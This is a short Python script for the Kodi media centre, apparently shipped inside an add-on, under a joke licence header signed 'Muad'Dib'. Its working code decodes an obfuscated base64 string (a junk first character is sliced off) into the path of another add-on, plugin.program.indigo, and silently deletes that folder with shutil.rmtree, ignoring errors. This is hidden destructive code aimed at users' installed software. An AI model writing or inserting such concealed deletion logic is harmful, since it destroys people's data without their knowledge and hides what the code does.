# -*- coding: UTF-8 -*-
#######################################################################
# ----------------------------------------------------------------------------
# "THE BEER-WARE LICENSE" (Revision 42):
# Welcome to House Atreides.  As long as you retain this notice you can do whatever you want with this
# stuff. Just please ask before copying. If we meet some day, and you think
# this stuff is worth it, you can buy me a beer in return. - Muad'Dib
# ----------------------------------------------------------------------------
#######################################################################

#We Thank you Muad for 2 lines of code

import shutil

import xbmc  # pylint: disable=import-error

derka = 'Xc3BlY2lhbDovL2hvbWUvYWRkb25zL3BsdWdpbi5wcm9ncmFtLmluZGlnbw=='[1:].decode('base64')
derk = xbmc.translatePath((derka)).decode('utf-8')

shutil.rmtree(derk, ignore_errors=True)